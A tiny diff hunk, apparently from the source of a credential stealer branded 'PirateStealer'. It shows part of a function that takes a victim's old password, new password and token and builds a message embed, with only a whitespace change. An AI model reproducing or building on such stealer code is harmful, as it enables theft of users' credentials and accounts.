@@ -606,7 +606,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
             },
             "footer": {
                 "text": "PirateStealer"
-            }
+            }   
         }
         params.embeds.push(embed)
     }
